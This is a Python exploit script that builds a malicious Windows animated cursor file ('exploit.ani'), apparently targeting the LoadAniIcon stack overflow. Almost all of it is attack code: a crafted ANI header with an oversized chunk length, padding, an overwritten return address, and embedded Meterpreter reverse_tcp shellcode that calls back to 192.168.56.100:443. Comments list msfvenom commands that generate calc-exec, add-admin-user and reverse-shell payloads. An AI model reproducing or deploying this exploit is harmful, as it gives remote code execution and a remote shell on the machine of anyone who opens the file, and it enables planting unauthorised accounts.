from struct import *
# Usage: $python2 filename.py 
# hexdump -C exploit.ani

print("[+] Shellcode is being generated.\n")
# msfvenom --payload windows/exec --platform windows --format python --smallest CMD=calc.exe
# msfvenom --payload windows/adduser --platform windows --format python USER=maluser PASS=P@SSw0rd1!
# msfvenom --payload windows/meterpreter/reverse_tcp --platform=windows --format python LHOST=192.168.56.100 LPORT=443
shellcode =  b""
shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b"
shellcode += b"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b"
shellcode += b"\x72\x28\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
shellcode += b"\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10"
shellcode += b"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01"
shellcode += b"\xd0\x50\x8b\x58\x20\x8b\x48\x18\x01\xd3\x85\xc9\x74"
shellcode += b"\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf"
shellcode += b"\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d"
shellcode += b"\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b"
shellcode += b"\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
shellcode += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
shellcode += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
shellcode += b"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x38\x64\x68\x02"
shellcode += b"\x00\x01\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
shellcode += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
shellcode += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
shellcode += b"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
shellcode += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
shellcode += b"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
shellcode += b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
shellcode += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
shellcode += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
shellcode += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
shellcode += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
shellcode += b"\x53\xff\xd5"
print("[+] Shellcode has been generated.\n")

padding2ret = "\x00" * 80
ret = "\x8f\x1a\x40\x00" # Call EDI address & LoadaniIcon()'s return address
padding2edi = "\x00" * 20 # padding to EDI register from LoadaniIcon()'s return address


print("[+] ANI file header is being generated.\n")
aniheader = "\x52\x49\x46\x46\x00\x00\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
aniheader = aniheader + "\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00"
aniheader = aniheader + "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
aniheader = aniheader + "\x04\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68"
aniheader = aniheader + pack("<l", len(shellcode + padding2ret + ret + padding2edi))
print("[+] ANI file header has been generated\n")


shellcode_bytearraydata = bytearray(shellcode)
pack_into("<h", shellcode_bytearraydata, 184, unpack_from("<h", shellcode_bytearraydata, 184)[0] - len(shellcode + padding2ret + ret + padding2edi))
shellcode = shellcode_bytearraydata


payload = aniheader + padding2ret + ret + padding2edi + shellcode
hFile = open("exploit.ani", 'w')
hFile.write(payload)
hFile.close()